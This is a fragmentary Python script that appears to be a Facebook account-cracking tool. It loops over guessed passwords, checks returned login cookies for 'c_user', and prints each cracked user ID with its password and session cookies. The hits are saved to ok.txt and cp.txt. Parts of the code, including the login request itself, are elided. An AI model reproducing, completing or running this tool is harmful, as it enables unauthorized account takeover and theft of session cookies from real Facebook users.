...
\033[1;35mTOOL VIRSION :  \033[1;32m1.3
\033[1;91m--------------------------------------------"""
loop = 0
oks = []
cps = []
...
def clear():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/profile.php?id=100075538218986&mibextid=ZbWKwL=NSMWBT')
    print(logo)
...
def xr():
    ...
    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Ids saved in SIFAT/ok.txt, SIFAT/cp.txt')
    print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(' \n\033[1;97m[\033[1;92mSIFAT-OK🔥\033[1;97m]\033[1;92m ' +uid+ '\033[1;91m<>\033[1;92m' +ps+ '\n \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m COOKIES 💚\033[1;91m=\033[1;96m '+coki+'')                
                ...
                continue
        loop+=1
        sys.stdout.write('\r \033[1;91m[\033[1;97mSIFAT-KING\033[1;91m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
        sys.stdout.flush()
    except:
        pass
